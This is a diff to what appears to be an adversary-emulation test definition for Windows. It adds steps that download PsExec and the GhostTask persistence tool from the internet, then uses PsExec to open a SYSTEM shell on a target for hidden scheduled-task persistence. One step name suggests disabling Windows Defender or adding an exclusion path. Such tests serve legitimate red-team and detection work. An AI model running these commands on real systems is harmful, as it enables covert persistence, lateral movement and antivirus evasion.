@@ -31,6 +31,22 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        PsExec tool from Sysinternals must exist in the ExternalPayloads directory
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") { exit 0} else { {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
+        }}
+      executor: powershell
+    - name: |
+        GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath "PathToAtomicsFolder\..\ExternalPayloads\"`
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe") { exit 0} else { {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
+        }}
+      executor: powershell
     - name: scheduled-task-("ghost-task")-via-registry-key-manipulation
       inline: |
         "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\{{.Args.target}} -accepteula -s "cmd.exe"
